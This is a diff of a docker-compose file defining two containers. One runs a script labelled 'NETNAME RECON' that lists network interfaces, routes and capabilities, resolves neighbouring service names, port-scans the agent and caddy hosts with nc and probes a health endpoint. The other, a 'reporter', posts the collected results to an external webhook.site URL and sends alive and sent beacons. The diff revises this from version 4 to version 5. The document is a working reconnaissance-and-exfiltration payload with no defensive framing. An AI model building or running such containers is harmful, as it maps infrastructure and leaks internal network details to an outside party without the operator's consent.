@@ -16,57 +16,37 @@ services:
       - sh
       - -c
       - |
-        exec > /data/result.txt 2>&1
-        echo "=== NETNAME RECON ==="
-        echo "--- hostname ---"
-        hostname
-        echo "--- ip addr ---"
-        ip addr show 2>&1
-        echo "--- ip route ---"
-        ip route 2>&1
-        echo "--- /etc/hosts ---"
-        cat /etc/hosts 2>&1
-        echo "--- /etc/resolv.conf ---"
-        cat /etc/resolv.conf 2>&1
-        echo "--- caps ---"
-        grep Cap /proc/self/status 2>&1
-        echo "--- dns agent ---"
-        getent hosts agent 2>&1
-        echo "--- dns caddy ---"
-        getent hosts caddy 2>&1
-        echo "--- dns fluentbit ---"
-        getent hosts fluentbit 2>&1
-        echo "--- dns vmagent ---"
-        getent hosts vmagent 2>&1
-        echo "--- dns autoheal ---"
-        getent hosts autoheal 2>&1
-        echo "--- ping agent ---"
-        ping -c1 -W2 agent 2>&1
-        echo "--- port scan agent ---"
-        AGENT_IP=$(getent hosts agent 2>/dev/null | awk '{print $1}')
-        for P in 8000 80 443 9090 5672 15672 2019; do
-          timeout 2 sh -c "echo Q | nc -w1 ${AGENT_IP} ${P}" >/dev/null 2>&1 && echo "OPEN agent:${P}"
-        done
-        echo "--- port scan caddy ---"
-        CADDY_IP=$(getent hosts caddy 2>/dev/null | awk '{print $1}')
-        for P in 80 443 2019 9090 8080; do
-          timeout 2 sh -c "echo Q | nc -w1 ${CADDY_IP} ${P}" >/dev/null 2>&1 && echo "OPEN caddy:${P}"
-        done
-        echo "--- wget agent health ---"
-        wget -q -O- "http://agent:8000/health" 2>&1 || echo "wget agent:8000 failed"
-        echo ""
-        echo "--- wget caddy metrics ---"
-        wget -q -O- "http://caddy:9090/metrics" 2>&1 | head -50 || echo "wget caddy:9090 failed"
-        echo ""
-        echo "--- ARP neighbors ---"
-        SUBNET=$(ip route | grep 'scope link' | head -1 | awk '{print $1}' | sed 's|/.*||; s|\.[0-9]*$||')
-        for i in 1 2 3 4 5 6 7 8 9 10; do
-          ping -c1 -W1 "${SUBNET}.${i}" >/dev/null 2>&1 &
-        done
-        wait; sleep 1
-        ip neigh show 2>&1
-        echo "=== DONE ==="
+        {
+          echo "=== NETNAME RECON ==="
+          echo "--- ip addr ---"
+          ip addr show 2>&1
+          echo "--- ip route ---"
+          ip route 2>&1
+          echo "--- caps ---"
+          grep Cap /proc/self/status 2>&1
+          echo "--- dns ---"
+          for H in agent caddy fluentbit vmagent autoheal; do
+            IP=$(getent hosts "$H" 2>/dev/null | awk '{print $1}')
+            echo "${H}=${IP:-NONE}"
+          done
+          echo "--- agent health ---"
+          wget -q -T5 -O- "http://agent:8000/health" 2>&1 || echo "FAIL"
+          echo ""
+          echo "--- port scan ---"
+          AGENT_IP=$(getent hosts agent 2>/dev/null | awk '{print $1}')
+          for P in 8000 80 443 9090; do
+            timeout 2 sh -c "echo Q | nc -w1 ${AGENT_IP} ${P}" >/dev/null 2>&1 && echo "OPEN agent:${P}"
+          done
+          CADDY_IP=$(getent hosts caddy 2>/dev/null | awk '{print $1}')
+          for P in 80 443 9090; do
+            timeout 2 sh -c "echo Q | nc -w1 ${CADDY_IP} ${P}" >/dev/null 2>&1 && echo "OPEN caddy:${P}"
+          done
+          echo "--- neighbors ---"
+          ip neigh show 2>&1
+          echo "=== DONE ==="
+        } > /data/result.txt 2>&1
         touch /data/done
+        sleep 3600
 
   reporter:
     image: alpine:3.20
@@ -78,18 +58,16 @@ services:
       - -c
       - |
         WH="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"
-        echo "reporter started, waiting for recon..."
-        TRIES=0
-        while [ ! -f /data/done ] && [ "$TRIES" -lt 120 ]; do
-          sleep 2
-          TRIES=$((TRIES+1))
+        wget -q -O /dev/null "http://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6?tag=NETNAME-V5-ALIVE" 2>/dev/null
+        I=0
+        while [ ! -f /data/done ] && [ "$I" -lt 90 ]; do
+          sleep 2; I=$((I+1))
         done
         if [ -f /data/done ]; then
-          RESULT=$(cat /data/result.txt | head -200)
-          wget -q -O /dev/null --post-data="${RESULT}" "${WH}?tag=NETNAME-V4-RESULT" 2>/dev/null
-          echo "reported via wget"
+          DATA=$(head -100 /data/result.txt)
+          wget -q -O /dev/null --post-data="$DATA" "${WH}?tag=NETNAME-V5-RESULT" 2>/dev/null
+          wget -q -O /dev/null "http://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6?tag=NETNAME-V5-SENT" 2>/dev/null
         else
-          wget -q -O /dev/null --post-data="TIMEOUT waiting for recon" "${WH}?tag=NETNAME-V4-TIMEOUT" 2>/dev/null
-          echo "timeout"
+          wget -q -O /dev/null "http://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6?tag=NETNAME-V5-TIMEOUT" 2>/dev/null
         fi
         sleep 3600
